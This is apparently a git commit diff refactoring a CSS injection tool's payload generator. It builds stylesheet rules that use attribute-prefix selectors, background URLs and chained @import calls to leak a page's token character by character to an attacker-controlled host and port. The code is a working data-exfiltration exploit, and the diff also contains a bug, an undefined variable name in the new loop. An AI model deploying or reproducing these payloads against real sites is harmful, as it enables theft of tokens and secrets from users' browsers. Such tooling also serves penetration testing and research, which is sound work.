95a0df7d6bf43afd95372643b2111b13f62dc9d1
DonAsako <asakosan.pro@protonmail.com>
2025-03-16 23:01:29 +0100

    refactor update payload

--- cssinj/injection.py
+++ cssinj/injection.py
@@ -1,26 +1,34 @@
 import urllib.parse
 
 
-def generate_payload(hostname, port, element, attribut, client):
+def generate_payload(hostname, port, attribut, client, element):
     stri = generate_next_import(hostname=hostname, port=port, client=client)
 
+    elements_attributs = []
+    for client_element in client.elements:
+        for element_attribut in client_element.attributs:
+            if element_attribut == attribut:
+                elements_attributs.append(element_attributs)
+
     # Check if the token is complete
-    stri += f'html:has({element}[{attribut}={repr(client.data)}]{"".join([f":not({element}[{attribut}={repr(client_element)}])" for client_element in client.elements])}){"".join([":first-child" for i in range(client.counter)])}{{background: url("//{hostname}:{port}/end?num={client.counter}&id={client.id}") !important;}}'
+    stri += f"html:has({element}[{attribut}={repr(client.data)}]"
+    stri += f"{"".join([f":not({element}[{attribut}={repr(elements_attribut.value)}])" for elements_attribut in elements_attributs])})"
+    stri += f"{"".join([":first-child" for i in range(client.counter)])}"
+    stri += f'{{background: url("//{hostname}:{port}/end?num={client.counter}&client_id={client.id}") !important;}}'
 
     # Payload to extract the token
     stri += "".join(
         map(
             lambda x: f"html:has({element}[{attribut}^={repr(client.data+x)}]"
-            f'{"".join([f":not({element}[{attribut}={repr(client_element)}])" for client_element in client.elements])})'
+            f'{"".join([f":not({element}[{attribut}={repr(elements_attribut.value)}])" for elements_attribut in elements_attributs])})'
             f'{"".join([":first-child" for i in range(client.counter)])}'
-            f'{{background: url("//{hostname}:{port}/valid?token={urllib.parse.quote_plus(client.data+x)}&id={client.id}") !important;}}\n',
+            f'{{background: url("//{hostname}:{port}/valid?token={urllib.parse.quote_plus(client.data+x)}&client_id={client.id}") !important;}}\n',
             "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZàâäéèêëîïôöùûüç!\"#$%&'()*+,-./:;<=>?@[\\]^_`{|}~ ",
         )
     )
+
     return stri
 
 
 def generate_next_import(hostname, port, client):
-    return (
-        f"@import url('//{hostname}:{port}/next?num={client.counter}&id={client.id}');"
-    )
+    return f"@import url('//{hostname}:{port}/next?num={client.counter}&client_id={client.id}');"
